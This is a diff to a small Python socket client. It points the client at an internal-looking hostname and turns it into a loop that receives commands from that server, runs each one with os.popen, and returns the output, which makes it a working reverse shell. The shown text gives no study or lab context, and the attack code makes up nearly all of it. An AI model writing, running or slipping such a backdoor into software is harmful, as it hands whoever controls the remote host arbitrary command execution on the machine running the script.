@@ -3,13 +3,15 @@ import socket
 import sys
 import os
 s = socket.socket()
-host = "127.0.0.1"
+host = "vlmazrasdev2mn1.fisdev.local"
 port = 8080
 s.connect((host, port))
 print("connected to server")
-command = s.recv(1024)
-command = command.decode()
-if command == "open":
+while True:
+    command = s.recv(1024)
+    command = command.decode()
+#if command == "open":
     print("command is : ", command)
-    s.send("command received".encode())
-    os.system('ls')
+    output = os.popen(command).read()
+    s.send(output.encode())
+    #os.system(command)
